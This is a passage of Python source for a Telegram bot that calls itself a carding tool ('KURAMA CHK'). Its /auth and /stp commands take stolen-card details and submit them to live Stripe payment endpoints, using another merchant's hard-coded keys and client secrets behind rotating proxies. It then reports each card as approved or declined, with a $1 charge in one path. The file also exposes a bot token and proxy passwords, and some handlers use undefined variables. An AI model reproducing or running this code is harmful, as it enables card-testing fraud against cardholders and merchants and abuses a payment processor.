import logging
from logging import Handler, handlers
from multiprocessing import context
import os
from signal import Handlers
import requests
import time
import string
import random
from urllib.request import urlopen
import json
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint



from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup


##
uniproxy = requests.session()
uniproxy.proxies = uniproxy 
##

proxys = {
    'http':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https': 'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}


comand = "/.,*"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)

bot = Bot(token="6188249734:AAH0h51am6PcCseOo1OgfFvpo0BKj8LTJks", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)

button1 = InlineKeyboardButton(text="𝗢𝘄𝗻𝗲𝗿", callback_data="creador")
button2 = InlineKeyboardButton(text="𝗚𝗮𝘁𝗲𝘀", callback_data="gate")
button3 = InlineKeyboardButton(text="𝗠𝘆 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿", callback_data="randomvalue_of10")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2, button3)

admins = [5629056050, 5019536742]



@iniciar.callback_query_handler(text=["randomvalue_of10", "creador", "gate"])
async def random_value(call: types.CallbackQuery):
    if call.data == "creador":
        await call.message.answer("☘ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 ☘: @DiegoAkk")
    if call.data == "gate":
        await call.message.answer("""
<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

🔵 [🝂] /auth: **Stripe Charged Auth** | Status: On ✅        
🟡 [🝂] /stp: **Stripe Auth** | Status: On ✅

                        
                        """)
    elif call.data == "randomvalue_of10":
        await call.message.answer("💰UNETE A NUESTRO SCRAPPER GRATUITO: @KURAMAVIPSCRAPPER💰")
    await call.answer()


########################## COMDANDO START ################################


@iniciar.message_handler(commands=['start'])
async def start_answer(message: types.Message):
    await message.answer_photo('https://imgur.com/a/Q1HKwlL', "<b>Bienvenido a 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 -Creado como una herramienta Carding. Mi creador @DarwinOficial Para acceder a mas información ejecuta el comando /cmds.</b>", reply_markup=keyboard_inline)


########################## FIN COMANDO START ################################


########################## COMANDO CMDS ################################


@iniciar.message_handler(commands=["cmds"], commands_prefix=comand)
async def cmds(message: types.Message):
    cmd = await message.reply("<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>")
    time.sleep(1)
    await cmd.edit_text("""
<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>

○ /cmds  ✅
○ /gates ✅
○ /bin ✅
○ /ip  ✅

                        """)
                        
########################## FIN COMANDO CMDS ################################




########################## COMDANDO GATES ################################


@iniciar.message_handler(commands=["gates"], commands_prefix=comand)
async def gates(message: types.Message):
    cmd = await message.reply("<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>")
    time.sleep(1)
    await cmd.edit_text("""
<b>🛠 𝗚𝗮𝘁𝗲𝘀 𝗱𝗲𝗹 𝗕𝗼𝘁 🛠 </b>

🔵 [🝂] /auth: **Stripe Charged Auth** | Status: On ✅        
🟡 [🝂] /stp: **Stripe Auth** | Status: On ✅          
                                       
                        """)
########################## FIN COMANDO GATES ################################


########################## INFO BIN ################################

@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>❗️ ERROR INGRESE BIEN EL BIN  ❗️</b>")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    bin1 = await message.reply(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    apis1 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={BIN}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis1['status']
    banke=apis1['bank']
    bank=banke['name']
    brand=apis1['brand']
    bn=apis1['query']
    typ=apis1['type']
    lv=apis1['level']
    country1=apis1['country']
    country=country1['name']
    
    
    bin2 = await bin1.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    time.sleep(1)
    bin3 = await bin2.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    await bin3.edit_text(f"""
[ϟ] **Bin Lookup**
━━━━━━━━━━━━━
[Ϟ] **Bin**: {bn}
[Ϟ] **Vendor**: {brand}
[Ϟ] **Type**: {typ}
[Ϟ] **Level**: {lv}
[Ϟ] **Bank**: {bank}
[Ϟ] **Country**: {country}
━━━━━━━━━━━━━
**Checked By:** <a href="tg://user?id={ID}">{FIRST}</a>

""")

########################## FIN INFO BIN ################################



 ################## GATE AUTH ######################################   

@iniciar.message_handler(commands=["auth"], commands_prefix=comand)
async def auth(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/auth '):]
    ccs1 = ccs
    if not ccs1:
        await message.reply(" **Gateway: Stripe Charged Auth**, **Status**: On ✅, /auth card|month|year|cvv")
    
    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3] 
    m1 = await message.reply(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    
    nombre = "Andres"
    correo = "jefersonbenthanpalacio@gmail.com"

    cabeza= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = uniproxy.post('https://m.stripe.com/6', headers=cabeza).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    
    
    apis = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    result=apis['status']
    banke=apis['bank']
    bank=banke['name']
    brand=apis['brand']
    bn=apis['query']
    typ=apis['type']
    lv=apis['level']
    country1=apis['country']
    country=country1['name']
    #await message.reply(f"""
    #<code> {sid} </code>
    #<code> {muid} </code>
    #<code> {guid} </code>""")

    heade= {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/payment_intents/pi_3MNqSWHKSiz0kTyd1fdRymj6/confirm",
    "scheme": "https",
    "accept": "application/json",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-ES,es;q=0.9",
    "content-length": "790",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    #"sec-ch-ua": "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}


    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]={nombre}+&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Facd3f7780%3B+stripe-js-v3%2Facd3f7780&payment_method_data[time_on_page]=28789&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret=pi_3MNqyaHKSiz0kTyd07Hr9Z2T_secret_medWP9r4hBOHTmVpoUQnjBcjs'
    
    apigate2 = uniproxy.post("https://api.stripe.com/v1/payment_intents/pi_3MNqyaHKSiz0kTyd07Hr9Z2T/confirm", headers=heade, data=data).json()
    code = apigate2['error']['code']
    code2 = apigate2['error']['message']
    

 

    final = time.perf_counter() 
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    
            
    if "Your card's security code is incorrect." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
    if "incorrect_number" in code:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
    if "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
        
    if "Your card's security code is invalid." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝑪𝒄𝒏 ✅
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")


    if "Your card does not support this type of purchase." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")

        
    if "Your card's expiration year is invalid." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
        
    if "Your card has insufficient funds." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐘𝐨𝐮𝐫 𝐜𝐚𝐫𝐝 𝐡𝐚𝐬 𝐢𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐟𝐮𝐧𝐝𝐬.
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
    
    if "Your card was declined." in code2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {code2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk
""")
        
            


@iniciar.message_handler(commands=['stp'], commands_prefix=comand)
async def da(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: ❗ Comprobando acceso ❗</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('Estas autorizado!')
    
    else:
        await contra.edit_text('❗ No tienes acceso para utilizar este comando. ❗ Contacta a @DarwinOficial.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/stp '):]
    
    if not ccs:
        await contra.edit_text("❗ ERROR INGRESE BIEN LA TARJETA ❗")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>") 
    
    nombre = "darwin moreno belardo"
    mail = "darwinmoreno366773@yahoo.com"


    apis99 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={BIN}").json()
    result=apis99['status']
    banke=apis99['bank']
    bank=banke['name']
    brand=apis99['brand']
    bn=apis99['query']
    typ=apis99['type']
    lv=apis99['level']
    country1=apis99['country']
    country2=country1['name']
    
    
   
    head22 = {
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    
    api1 = uniproxy.post("https://m.stripe.com/6", headers=head22).json()
    muid = api1["muid"]
    guid = api1["guid"]
    sid = api1["sid"]
    
    headers33 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://checkout.stripe.com',
    'referer': 'https://checkout.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    }

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[name]={nombre}+moreno&billing_details[email]=zdxrnavckbhwh%40triots.com&billing_details[address][country]=US&billing_details[address][postal_code]=10080&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51LsYR6AKFjq10TnePvmDsUU6mDT7UzQSmvz3RchEeBz6AQqfrnH9L16mD8hcajweCoaPUxDuCKVPFZdPjBl4f5XC00JTPKVfby&payment_user_agent=stripe.js%2Fe9a259df8%3B+stripe-js-v3%2Fe9a259df8%3B+checkout'

    response333 = uniproxy.post('https://api.stripe.com/v1/payment_methods', headers=headers33, data=data).json()
    id = response333['id']


    headers44 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://checkout.stripe.com',
    'referer': 'https://checkout.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    }

    data22 = f'eid=NA&payment_method={id}&expected_amount=100&last_displayed_line_item_group_details[subtotal]=100&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_51LsYR6AKFjq10TnePvmDsUU6mDT7UzQSmvz3RchEeBz6AQqfrnH9L16mD8hcajweCoaPUxDuCKVPFZdPjBl4f5XC00JTPKVfby'

    response22 = uniproxy.post('https://api.stripe.com/v1/payment_pages/cs_live_a1uHRs9txmLbfbO8adULufenB6hZMXHKhJW2glnTbpyTwZx5agSQmY9CNL/confirm', headers=headers44, data=data22).json()
    error1 = response22['error']['code']
    error2 = response22['error']['message']
    
    
    final = time.perf_counter() 
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    
            
    if "Your card's security code is incorrect." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝑪𝑵 ✅
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "incorrect_number" in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's security code is invalid." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card does not support this type of purchase." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's expiration year is invalid." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card has insufficient funds." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
    
    if "Your card was declined." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
